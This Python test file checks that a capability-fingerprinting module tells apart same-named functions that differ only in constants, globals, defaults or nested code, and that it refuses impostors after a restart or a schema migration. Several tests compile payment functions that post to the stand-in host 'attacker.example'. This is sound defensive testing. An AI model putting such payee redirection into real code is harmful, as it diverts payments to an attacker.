"""What a capability fingerprint must cover: the code, not the shape of the code.

An artifact fingerprint used to hash `co_code` -- the instruction stream -- and
nothing else the code object holds. Instructions address their operands by
index, so the constants a function returns, the globals it calls and the code
objects nested inside it were all reachable only through tables that were never
hashed. Two functions of the same name whose only difference is which URL they
post to compile to byte-identical instructions and were therefore *one
artifact*: after a restart, the second could take over the first's capability
token, satisfy the durable record and satisfy the decision that named it.

That is the substitution the durable capability record exists to refuse, so
these tests are written against that scenario rather than against the digest.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from singular.execution_capability import (
    SCHEMA_VERSION,
    V1_FINGERPRINT_REVOCATION,
    DurableCapabilityStore,
    ExecutionCapabilityRegistry,
    artifact_fingerprint,
)

#: One module name for every compiled variant below, so module and qualified
#: name are identical and only the body differs -- the impostor's advantage.
PAYMENTS = "singular.providers.payments"


def _compile(body: str, *, name: str = "send", signature: str = "action") -> object:
    source = f"def {name}({signature}):\n{body}\n"
    namespace: dict[str, object] = {"__name__": PAYMENTS}
    exec(compile(source, "payments.py", "exec"), namespace)  # noqa: S102 - the point of the test
    return namespace[name]


def _pays(host: str) -> object:
    return _compile(f'    return post("https://{host}/pay")')


# --- the substitution --------------------------------------------------------

def test_two_payees_behind_one_name_are_not_one_artifact():
    """The scenario in one line: same name, same instructions, different payee."""
    supplier, attacker = _pays("bank.example"), _pays("attacker.example")
    assert supplier.__qualname__ == attacker.__qualname__
    assert supplier.__code__.co_code == attacker.__code__.co_code, "the instructions really are identical"
    assert artifact_fingerprint(supplier) != artifact_fingerprint(attacker)


def test_the_same_implementation_still_fingerprints_the_same():
    """Otherwise a legitimate restart could never re-register anything."""
    assert artifact_fingerprint(_pays("bank.example")) == artifact_fingerprint(_pays("bank.example"))


def test_calling_a_different_global_is_a_different_artifact():
    """`log(action)` and `wire_transfer(action)` differ only in co_names."""
    logs = _compile("    return log(action)")
    wires = _compile("    return wire_transfer(action)")
    assert logs.__code__.co_code == wires.__code__.co_code
    assert artifact_fingerprint(logs) != artifact_fingerprint(wires)


def test_a_default_argument_is_part_of_the_artifact():
    """Defaults are evaluated at definition and live on the function, not the code."""
    to_bank = _compile("    return post(url)", signature='action, url="https://bank.example/pay"')
    to_attacker = _compile("    return post(url)", signature='action, url="https://attacker.example/pay"')
    assert to_bank.__code__ is not to_attacker.__code__
    assert artifact_fingerprint(to_bank) != artifact_fingerprint(to_attacker)


def test_a_keyword_only_default_is_part_of_the_artifact():
    to_bank = _compile("    return post(url)", signature='action, *, url="https://bank.example/pay"')
    to_attacker = _compile("    return post(url)", signature='action, *, url="https://attacker.example/pay"')
    assert artifact_fingerprint(to_bank) != artifact_fingerprint(to_attacker)


def test_code_nested_in_a_constant_is_covered():
    """A comprehension or lambda is a code object stored in co_consts."""
    keeps_a = _compile('    return [item for item in action if item == "a"]')
    keeps_b = _compile('    return [item for item in action if item == "b"]')
    assert artifact_fingerprint(keeps_a) != artifact_fingerprint(keeps_b)


def test_a_provider_class_is_covered_the_same_way():
    """The object path hashes class methods; it hashed their bytecode alone too."""
    def provider(host: str) -> object:
        namespace: dict[str, object] = {"__name__": PAYMENTS}
        exec(  # noqa: S102 - the point of the test
            compile(
                "class Provider:\n"
                "    def execute(self, request, key):\n"
                f'        return post("https://{host}/pay")\n',
                "payments.py",
                "exec",
            ),
            namespace,
        )
        return namespace["Provider"]()

    assert artifact_fingerprint(provider("bank.example")) != artifact_fingerprint(provider("attacker.example"))


def test_constants_that_json_would_flatten_stay_distinct():
    """1, True and 1.0 are one value to json; they are three constants here."""
    fingerprints = {artifact_fingerprint(_compile(f"    return {literal}")) for literal in ("1", "True", "1.0")}
    assert len(fingerprints) == 3
    assert artifact_fingerprint(_compile("    return 0.0")) != artifact_fingerprint(_compile("    return -0.0"))


def test_a_constant_that_cannot_be_canonicalised_is_refused_not_ignored(tmp_path: Path):
    """Fail closed: an unfingerprintable constant must not become an empty one.

    The compiler cannot produce such a constant, so reaching this means the code
    object was assembled by hand -- exactly when guessing is worst.
    """
    handler = _pays("bank.example")
    handler.__code__ = handler.__code__.replace(co_consts=(None, object()))

    with pytest.raises(ValueError, match="cannot be fingerprinted"):
        artifact_fingerprint(handler)

    store = DurableCapabilityStore(tmp_path / "capabilities.db")
    store.bind("cap_const", _pays("bank.example"))
    assert store.verify("cap_const", handler) is False


# --- the restart the durable record exists for -------------------------------

def test_an_impostor_of_the_same_name_cannot_take_over_the_token(tmp_path: Path):
    path = tmp_path / "capabilities.db"
    DurableCapabilityStore(path).bind("cap_pay", _pays("bank.example"))

    restarted = DurableCapabilityStore(path)
    assert restarted.verify("cap_pay", _pays("bank.example")) is True
    assert restarted.verify("cap_pay", _pays("attacker.example")) is False
    with pytest.raises(PermissionError, match="different executable artifact"):
        restarted.bind("cap_pay", _pays("attacker.example"))


def test_a_registry_rebuilt_after_a_restart_refuses_the_impostor(tmp_path: Path):
    """The whole path: fresh in-memory registry, same durable database."""
    path = tmp_path / "capabilities.db"
    ExecutionCapabilityRegistry(DurableCapabilityStore(path)).register(_pays("bank.example"), "cap_pay")

    restarted = ExecutionCapabilityRegistry(DurableCapabilityStore(path))
    with pytest.raises(PermissionError, match="different executable artifact"):
        restarted.register(_pays("attacker.example"), "cap_pay")

    legitimate = _pays("bank.example")
    token = restarted.register(legitimate, "cap_pay")
    assert restarted.matches(token, legitimate) is True
    assert restarted.matches(token, _pays("bank.example")) is False, "in-process, an equal implementation is still another object"


# --- the databases written before this ---------------------------------------

def _write_v1_database(path: Path) -> None:
    """A capability database exactly as schema v1 left it."""
    store = DurableCapabilityStore(path)
    store.bind("cap_legacy", _pays("bank.example"))
    with store._connect() as conn:
        conn.execute("UPDATE execution_capability_schema SET version=1")


def test_a_v1_binding_is_revoked_rather_than_carried_forward(tmp_path: Path):
    """Its fingerprint cannot be recomputed here and cannot be trusted as it is."""
    path = tmp_path / "capabilities.db"
    _write_v1_database(path)

    migrated = DurableCapabilityStore(path)
    record = migrated.get("cap_legacy")
    assert record is not None
    assert record.active is False
    assert record.revoked_reason == V1_FINGERPRINT_REVOCATION
    assert migrated.verify("cap_legacy", _pays("bank.example")) is False


def test_a_v1_token_cannot_be_re_bound_and_says_why(tmp_path: Path):
    """Deleting the rows instead would hand every token to whoever re-binds first."""
    path = tmp_path / "capabilities.db"
    _write_v1_database(path)
    migrated = DurableCapabilityStore(path)

    with pytest.raises(PermissionError, match="rotate to a new capability id"):
        migrated.bind("cap_legacy", _pays("bank.example"))

    rotated = migrated.bind("cap_rotated", _pays("bank.example"))
    assert rotated.active is True


def test_the_migration_runs_once_and_leaves_a_v2_database(tmp_path: Path):
    path = tmp_path / "capabilities.db"
    _write_v1_database(path)
    DurableCapabilityStore(path)

    reopened = DurableCapabilityStore(path)
    with reopened._connect() as conn:
        assert int(conn.execute("SELECT version FROM execution_capability_schema").fetchone()["version"]) == SCHEMA_VERSION
    fresh = reopened.bind("cap_after", _pays("bank.example"))
    assert fresh.active is True

    reopened.revoke("cap_after")
    assert DurableCapabilityStore(path).get("cap_after").active is False


def test_a_schema_from_the_future_is_still_refused(tmp_path: Path):
    path = tmp_path / "capabilities.db"
    store = DurableCapabilityStore(path)
    with store._connect() as conn:
        conn.execute("UPDATE execution_capability_schema SET version=99")
    with pytest.raises(RuntimeError, match="does not match"):
        DurableCapabilityStore(path)
